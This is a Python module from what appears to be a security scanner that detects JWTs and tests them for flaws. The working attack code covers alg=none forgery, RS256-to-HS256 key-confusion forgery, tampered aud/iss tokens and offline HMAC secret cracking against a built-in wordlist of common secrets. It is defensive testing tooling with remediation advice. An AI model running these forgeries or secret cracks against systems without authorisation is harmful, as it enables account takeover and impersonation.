"""JWT security analysis module — detects and tests JWT vulnerabilities."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from typing import Any
from urllib.parse import urljoin

from auth_scan.attacks.base import (
    BaseAttackModule,
    Finding,
    ModuleResult,
    ScanReport,
    Severity,
)
from auth_scan.core.session import TokenInfo


class JWTAnalyzer(BaseAttackModule):
    """Analyze JWT tokens for common vulnerabilities.

    Covers:
    - FR-JWT-001: Detect JWTs in headers, cookies, response body
    - FR-JWT-002: Decode header + payload, report algorithm
    - FR-JWT-003: alg=none attack
    - FR-JWT-004: Key confusion (RS256 -> HS256 with public key)
    - FR-JWT-005: Expiry check
    - FR-JWT-006: nbf (not-before) check
    - FR-JWT-007: Sensitive data in payload
    - FR-JWT-008: aud/iss validation
    """

    name = "jwt"
    description = "Detect and analyze JWT tokens for common vulnerabilities"
    version = "1.0.0"
    priority = 10

    def run(
        self,
        target: str,
        http_client: Any,
        report: ScanReport,
        config: Any,
    ) -> ModuleResult:
        result = ModuleResult()
        jwt_tokens: list[TokenInfo] = []

        # FR-JWT-001: Discover JWTs from probe metadata and make exploratory requests
        jwt_tokens.extend(self._discover_jwts(report, http_client))

        # FR-JWT-002: Decode and analyze each token
        for token in jwt_tokens:
            if not token.is_jwt:
                continue

            result.findings.append(Finding(
                title=f"JWT Discovered ({token.algorithm or 'unknown algorithm'})",
                description=f"JWT token found in {token.location}: {token.source_name}. "
                f"Algorithm: {token.algorithm or 'unknown'}.",
                severity=Severity.INFO,
                evidence={
                    "location": token.location,
                    "source": token.source_name,
                    "algorithm": token.algorithm,
                    "header_keys": list(token.header.keys()),
                },
                module_name=self.name,
                tags=["jwt", "discovery"],
            ))

            # FR-JWT-003: alg=none
            result.findings.extend(self._test_alg_none(token, http_client, target))

            # FR-JWT-004: Key confusion
            result.findings.extend(self._test_key_confusion(token, http_client, target))

            # FR-JWT-005: Expiry
            result.findings.extend(self._check_expiry(token))

            # FR-JWT-006: nbf
            result.findings.extend(self._check_nbf(token))

            # FR-JWT-007: Sensitive data
            result.findings.extend(self._check_sensitive_data(token))

            # FR-JWT-008: aud/iss
            result.findings.extend(self._check_claims(token, http_client, target))

            # JWT Cracker: wordlist-based HMAC secret cracking (offline)
            result.findings.extend(self._crack_hmac_secret(token, config))

        if not jwt_tokens:
            result.findings.append(Finding(
                title="No JWT Tokens Found",
                description="No JWT tokens were discovered during probing. "
                "The target may not use JWTs, or they may be hidden in JavaScript or API calls.",
                severity=Severity.INFO,
                module_name=self.name,
                tags=["jwt"],
            ))

        result.state_update["jwt_tokens_analyzed"] = len(jwt_tokens)
        return result

    def _discover_jwts(self, report: ScanReport, http_client: Any) -> list[TokenInfo]:
        """Discover JWT tokens from various locations."""
        tokens: list[TokenInfo] = []

        # From session cookies (from probe metadata or session state)
        cookies = report.session_state.get("probe_cookies", {})
        if not cookies:
            cookies = report.metadata.get("probe_cookies", {})

        # Also check cookies from the HTTP client's own session (e.g., --cookie flag)
        client_cookies = {}
        if hasattr(http_client, 'session'):
            client_cookies = dict(http_client.session.cookies)

        all_cookies = {**client_cookies, **cookies}

        for name, value in all_cookies.items():
            if self._looks_like_jwt(value):
                tokens.append(TokenInfo.from_string(value, "cookie", name))

        # From Authorization header in last response
        last_headers = report.metadata.get("probe_headers", {})
        for header_name, header_value in last_headers.items():
            if header_name.lower() == "authorization" and "bearer" in header_value.lower():
                raw = header_value.replace("Bearer ", "").replace("bearer ", "")
                if self._looks_like_jwt(raw):
                    tokens.append(TokenInfo.from_string(raw, "header", "Authorization"))

        # From response body (best-effort regex)
        body = report.metadata.get("probe_body", "")
        if body:
            for match in re.finditer(r"eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]+", body):
                raw_jwt = match.group(0)
                tokens.append(TokenInfo.from_string(raw_jwt, "body", "response body"))

        # Check common API endpoints for JWTs
        for endpoint in ["/api/profile", "/api/user", "/api/token", "/.well-known/jwks.json"]:
            try:
                resp = http_client.get(endpoint)
                if resp.status_code == 200:
                    # Check response body
                    body_text = resp.text
                    for match in re.finditer(r"eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]+", body_text):
                        raw_jwt = match.group(0)
                        tokens.append(TokenInfo.from_string(raw_jwt, "body", endpoint))

                    # Check response cookies
                    for cookie in resp.cookies:
                        if self._looks_like_jwt(cookie.value):
                            tokens.append(TokenInfo.from_string(cookie.value, "cookie", cookie.name))
            except Exception:
                pass

        return tokens

    @staticmethod
    def _looks_like_jwt(value: str) -> bool:
        """Check if a string looks like a JWT (three base64url sections)."""
        parts = value.split(".")
        if len(parts) != 3:
            return False
        # Each part should be base64url-encoded JSON or signature
        for part in parts:
            if not re.match(r"^[a-zA-Z0-9_-]+$", part):
                return False
        return True

    def _test_alg_none(
        self, token: TokenInfo, http_client: Any, target: str,
    ) -> list[Finding]:
        """FR-JWT-003: Test if alg=none is accepted."""
        findings: list[Finding] = []

        try:
            # Craft a JWT with alg:none and empty signature
            none_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(token.payload).encode()
            ).rstrip(b"=").decode()
            none_jwt = f"{none_header}.{payload_b64}."

            # Test against common endpoints
            for endpoint in ["/api/profile", "/api/user", "/api/me", "/"]:
                try:
                    resp = http_client.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {none_jwt}"},
                    )
                    if resp.status_code == 200 and "error" not in resp.text.lower():
                        findings.append(Finding(
                            title="JWT alg=none Accepted",
                            description=(
                                "The server accepted a JWT with 'alg':'none' and an empty signature. "
                                "This allows attackers to forge tokens with arbitrary payloads "
                                "without any cryptographic signature."
                            ),
                            severity=Severity.CRITICAL,
                            evidence={
                                "request": {
                                    "endpoint": endpoint,
                                    "token_alg": "none",
                                },
                                "response": {
                                    "status": resp.status_code,
                                    "body_preview": resp.text[:300],
                                },
                            },
                            remediation=(
                                "Configure the JWT validation library to explicitly reject tokens "
                                "with 'alg':'none'. For PyJWT: pass 'algorithms=[\"RS256\"]' "
                                "to jwt.decode(). For Node jsonwebtoken: use "
                                "'algorithms: [\"RS256\"]' option."
                            ),
                            cwe_id="CWE-347",
                            cvss_score=9.8,
                            module_name=self.name,
                            confidence=0.98,
                            tags=["jwt", "signature-bypass", "critical"],
                        ))
                        break
                except Exception:
                    pass
        except Exception:
            pass

        return findings

    def _test_key_confusion(
        self, token: TokenInfo, http_client: Any, target: str,
    ) -> list[Finding]:
        """FR-JWT-004: Test RS256 -> HS256 key confusion."""
        findings: list[Finding] = []

        if not token.algorithm or not token.algorithm.startswith("RS"):
            return findings

        try:
            # Fetch JWKS or extract public key
            public_key_pem = self._fetch_public_key(http_client, target, token)
            if not public_key_pem:
                return findings

            # Craft HS256 JWT signed with public key
            hs256_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(token.payload).encode()
            ).rstrip(b"=").decode()

            signing_input = f"{hs256_header}.{payload_b64}".encode()
            signature = hmac.new(
                public_key_pem.encode(),
                signing_input,
                hashlib.sha256,
            ).digest()
            sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
            hs256_jwt = f"{hs256_header}.{payload_b64}.{sig_b64}"

            # Test
            for endpoint in ["/api/profile", "/api/user", "/"]:
                try:
                    resp = http_client.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {hs256_jwt}"},
                    )
                    if resp.status_code == 200:
                        findings.append(Finding(
                            title="JWT Key Confusion Vulnerable (RS256→HS256)",
                            description=(
                                "Server uses RS256 but accepts HS256-signed tokens. "
                                "When the public key is known (e.g., from a JWKS endpoint), "
                                "an attacker can use it as the HMAC secret to forge tokens."
                            ),
                            severity=Severity.CRITICAL,
                            evidence={
                                "original_alg": token.algorithm,
                                "attack_alg": "HS256",
                                "endpoint": endpoint,
                                "response_status": resp.status_code,
                            },
                            remediation=(
                                "Configure the JWT library to only accept the expected "
                                "algorithm(s). Never use the same secret for HMAC that "
                                "is exposed as a public key. Use 'algorithms=[\"RS256\"]' "
                                "explicitly."
                            ),
                            cwe_id="CWE-327",
                            cvss_score=9.8,
                            module_name=self.name,
                            confidence=0.95,
                            tags=["jwt", "key-confusion", "critical"],
                        ))
                        break
                except Exception:
                    pass
        except Exception:
            pass

        return findings

    def _fetch_public_key(self, http_client: Any, target: str, token: TokenInfo) -> str | None:
        """Try to fetch the public key from JWKS endpoint or token header."""
        # Try JWKS endpoint
        for jwks_url in [
            "/.well-known/jwks.json",
            "/.well-known/openid-configuration/jwks",
            "/jwks.json",
            "/api/jwks",
        ]:
            try:
                resp = http_client.get(jwks_url)
                if resp.status_code == 200:
                    jwks = resp.json()
                    keys = jwks.get("keys", [])
                    kid = token.header.get("kid")
                    for key in keys:
                        if kid and key.get("kid") != kid:
                            continue
                        if key.get("kty") == "RSA" and key.get("n") and key.get("e"):
                            # We have a public key; in a real implementation we'd
                            # construct the PEM from n and e using cryptography library
                            return f"{key.get('n','')}{key.get('e','')}"
                    # Return the first RSA key's PEM representation
                    for key in keys:
                        if key.get("kty") == "RSA":
                            from cryptography.hazmat.primitives.asymmetric import rsa
                            from cryptography.hazmat.primitives import serialization
                            from cryptography.hazmat.backends import default_backend
                            import base64 as b64

                            n = int.from_bytes(
                                b64.urlsafe_b64decode(key["n"] + "=="), "big"
                            )
                            e = int.from_bytes(
                                b64.urlsafe_b64decode(key["e"] + "=="), "big"
                            )
                            pub_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
                            pem = pub_key.public_bytes(
                                serialization.Encoding.PEM,
                                serialization.PublicFormat.SubjectPublicKeyInfo,
                            )
                            return pem.decode()
            except Exception:
                pass

        return None

    def _check_expiry(self, token: TokenInfo) -> list[Finding]:
        """FR-JWT-005: Check token expiry."""
        findings: list[Finding] = []

        if token.expires:
            from datetime import datetime, timezone as tz
            now = datetime.now(tz.utc)
            if token.expires < now:
                delta = now - token.expires
                findings.append(Finding(
                    title="JWT Token Expired",
                    description=f"JWT token expired {delta.days} days ago but may still be accepted.",
                    severity=Severity.HIGH,
                    evidence={
                        "exp": token.expires.isoformat(),
                        "now": now.isoformat(),
                        "days_expired": delta.days,
                    },
                    remediation="Ensure expired JWTs are always rejected. Set short lifetimes (15-60 minutes).",
                    cwe_id="CWE-613",
                    module_name=self.name,
                    confidence=0.8,
                    tags=["jwt", "expiry"],
                ))
            else:
                lifetime = token.expires - now
                if lifetime.days > 1:
                    findings.append(Finding(
                        title="JWT Token Lifetime Too Long",
                        description=f"JWT token expires in {lifetime.days} days, which is excessive.",
                        severity=Severity.LOW,
                        evidence={
                            "expires_in_days": lifetime.days,
                            "expiry": token.expires.isoformat(),
                        },
                        remediation="Set JWT lifetime to 15-60 minutes. Use refresh tokens for longer sessions.",
                        cwe_id="CWE-613",
                        module_name=self.name,
                        confidence=0.95,
                        tags=["jwt", "expiry"],
                    ))
        else:
            findings.append(Finding(
                title="JWT Missing exp Claim",
                description="JWT token has no expiration claim. The token will be valid indefinitely.",
                severity=Severity.MEDIUM,
                evidence={"claims": list(token.payload.keys())},
                remediation="Always include an 'exp' claim with a short lifetime (15-60 minutes).",
                cwe_id="CWE-613",
                module_name=self.name,
                confidence=0.95,
                tags=["jwt", "expiry"],
            ))

        return findings

    def _check_nbf(self, token: TokenInfo) -> list[Finding]:
        """FR-JWT-006: Check not-before claim."""
        findings: list[Finding] = []
        if token.not_before:
            from datetime import datetime, timezone as tz
            if token.not_before > datetime.now(tz.utc):
                findings.append(Finding(
                    title="JWT Not-Before Claim in Future",
                    description="JWT nbf claim is in the future, indicating potential clock skew or misconfiguration.",
                    severity=Severity.LOW,
                    evidence={"nbf": token.not_before.isoformat()},
                    remediation="Ensure server clocks are synchronized (NTP) and nbf is set correctly.",
                    module_name=self.name,
                    confidence=0.9,
                    tags=["jwt", "nbf"],
                ))
        return findings

    def _check_sensitive_data(self, token: TokenInfo) -> list[Finding]:
        """FR-JWT-007: Check for sensitive data in payload."""
        findings: list[Finding] = []
        issues = token.has_sensitive_data()
        for issue in issues:
            findings.append(Finding(
                title="Sensitive Data in JWT Payload",
                description=f"JWT payload contains sensitive information: {issue}",
                severity=Severity.HIGH,
                evidence={"issue": issue},
                remediation=(
                    "Do not store sensitive data (passwords, PII, internal IDs) in JWT payloads. "
                    "JWTs are base64-encoded, not encrypted, and anyone can decode them."
                ),
                cwe_id="CWE-312",
                module_name=self.name,
                confidence=0.95,
                tags=["jwt", "sensitive-data"],
            ))
        return findings

    def _check_claims(
        self, token: TokenInfo, http_client: Any, target: str,
    ) -> list[Finding]:
        """FR-JWT-008: Check aud/iss claim validation."""
        findings: list[Finding] = []

        has_aud = "aud" in token.payload
        has_iss = "iss" in token.payload

        if not has_aud and not has_iss:
            return findings

        # Test with incorrect aud/iss
        try:
            header_b64 = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()

            tampered_payload = dict(token.payload)
            if has_aud:
                tampered_payload["aud"] = "evil-audience"
            if has_iss:
                tampered_payload["iss"] = "https://evil-issuer.com"

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(tampered_payload).encode()
            ).rstrip(b"=").decode()
            tampered_jwt = f"{header_b64}.{payload_b64}."

            for endpoint in ["/api/profile", "/api/user", "/"]:
                try:
                    resp = http_client.get(
                        endpoint,
                        headers={"Authorization": f"Bearer {tampered_jwt}"},
                    )
                    if resp.status_code == 200:
                        findings.append(Finding(
                            title="JWT aud/iss Claims Not Validated",
                            description=(
                                "Server accepted a JWT with incorrect audience/issuer claims. "
                                "This allows cross-service token misuse."
                            ),
                            severity=Severity.HIGH,
                            evidence={
                                "tampered_aud": "evil-audience" if has_aud else None,
                                "tampered_iss": "https://evil-issuer.com" if has_iss else None,
                                "response_status": resp.status_code,
                            },
                            remediation="Always validate aud and iss claims in JWT verification.",
                            cwe_id="CWE-287",
                            module_name=self.name,
                            confidence=0.9,
                            tags=["jwt", "claims"],
                        ))
                        break
                except Exception:
                    pass
        except Exception:
            pass

        return findings

    # ── JWT Cracker ───────────────────────────────────────────

    JWT_SECRET_WORDLIST: list[str] = [
        "secret", "key", "password", "changeme", "private",
        "token", "jwt_secret", "jwt-secret", "mysecret", "super_secret",
        "auth", "authentication", "authorization", "123456", "123456789",
        "admin", "root", "pass", "passwd", "p@ssw0rd", "letmein",
        "qwerty", "abc123", "monkey", "dragon", "master", "shadow",
        "sunshine", "princess", "football", "iloveyou", "trustno1",
        "welcome", "login", "default", "test", "testing", "temp",
        "jwt", "jwtkey", "hmac", "hmac_key", "hmac-secret",
        "session", "access", "api", "api_key", "api_secret",
        "base64", "sha256", "md5", "encode", "decode", "sign",
        "signing", "signature", "encrypt", "decrypt", "cipher",
        "production", "staging", "development", "dev", "stage",
        "config", "configuration", "settings", "env", "environment",
        "localhost", "127.0.0.1", "0.0.0.0", "app", "application",
        "server", "service", "client", "user", "username", "email",
        "company", "project", "backend", "frontend", "database",
        "mongo", "postgres", "mysql", "redis", "elastic", "docker",
        "kubernetes", "aws", "azure", "gcp", "cloud", "deploy",
        "version", "release", "v1.0", "v2.0", "beta", "alpha",
        "demo", "example", "sample", "public", "open", "free",
        "hello", "world", "foobar", "bar", "baz", "qux",
        "secret123", "key123", "password123", "pass123",
        "jwt-secret", "jwt_secret_key", "auth_secret", "session_secret",
        "csrf-secret", "csrf_secret", "cookie_secret", "encryption_key",
        "weak-secret-12345",
        "hardcoded", "hardcoded-secret", "hard-coded",
    ]

    def _crack_hmac_secret(
        self, token: TokenInfo, config: Any,
    ) -> list[Finding]:
        """Attempt offline HMAC secret cracking using a wordlist."""
        findings: list[Finding] = []

        if not token.is_jwt or not token.algorithm:
            return findings

        alg = token.algorithm.upper()
        if not alg.startswith("HS"):
            return findings

        hash_funcs = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}
        hash_name = hash_funcs.get(alg, "sha256")

        wordlist: list[str] = []
        wordlist_path = getattr(config, "jwt_wordlist", "")
        if wordlist_path:
            try:
                with open(wordlist_path) as f:
                    wordlist = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            except Exception:
                pass

        if not wordlist:
            wordlist = self.JWT_SECRET_WORDLIST

        max_attempts = min(len(wordlist), 5000)
        parts = token.raw.split(".")
        signing_input = f"{parts[0]}.{parts[1]}".encode()

        import hashlib
        import hmac
        import base64

        target_sig_raw = None
        try:
            padding = 4 - len(parts[2]) % 4
            sig_part = parts[2] + "=" * padding if padding != 4 else parts[2]
            target_sig_raw = base64.urlsafe_b64decode(sig_part)
        except Exception:
            return findings

        for secret in wordlist[:max_attempts]:
            try:
                computed_sig = hmac.new(secret.encode(), signing_input, hash_name).digest()
                if hmac.compare_digest(computed_sig, target_sig_raw):
                    findings.append(Finding(
                        title=f"JWT HMAC Secret Cracked ({alg})",
                        description=f"The JWT HS256 secret was cracked: '{secret}'. Attackers can forge arbitrary tokens.",
                        severity=Severity.CRITICAL,
                        evidence={"algorithm": alg, "secret": "[REDACTED]", "secret_length": len(secret)},
                        remediation="Use a strong random secret (256+ bits). Use RS256/ES256 for distributed systems.",
                        cwe_id="CWE-327",
                        cvss_score=9.8,
                        module_name=self.name,
                        confidence=0.99,
                        tags=["jwt", "cracking", "hmac", "critical"],
                    ))
                    break
            except Exception:
                pass

        return findings
